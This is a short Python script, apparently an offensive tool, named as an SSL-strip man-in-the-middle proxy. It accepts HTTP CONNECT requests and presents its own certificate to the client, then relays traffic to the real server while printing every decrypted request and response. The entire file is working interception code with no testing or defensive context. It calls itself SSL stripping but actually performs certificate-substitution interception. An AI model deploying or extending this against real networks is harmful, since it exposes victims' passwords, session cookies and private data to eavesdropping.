# File: tools/mitm_sslstrip.py

import socket
import ssl
import threading

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8888

def handle_client(client_sock):
    data = client_sock.recv(4096)
    if b"CONNECT" in data:
        # Simplified: parse target host:port
        first_line = data.split(b"\n")[0]
        target = first_line.split(b" ")[1]
        target_host, target_port = target.split(b":")
        target_port = int(target_port)
        client_sock.send(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        # Wrap client into SSL
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_client = context.wrap_socket(client_sock, server_side=True, certfile="cert.pem", keyfile="key.pem")

        # Connect to real target
        server = socket.create_connection((target_host.decode(), target_port))
        ssl_server = ssl.wrap_socket(server)

        # Relay both directions
        def client_to_server():
            while True:
                try:
                    d = ssl_client.recv(4096)
                    if not d:
                        break
                    print(f"[MITM][C→S] {d}")
                    ssl_server.send(d)
                except:
                    break
        def server_to_client():
            while True:
                try:
                    d = ssl_server.recv(4096)
                    if not d:
                        break
                    print(f"[MITM][S→C] {d}")
                    ssl_client.send(d)
                except:
                    break
        threading.Thread(target=client_to_server, daemon=True).start()
        threading.Thread(target=server_to_client, daemon=True).start()

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((LISTEN_HOST, LISTEN_PORT))
    sock.listen(5)
    print(f"MITM SSL‑Strip listening on {LISTEN_HOST}:{LISTEN_PORT}")
    while True:
        client, _ = sock.accept()
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()

if __name__ == "__main__":
    main()
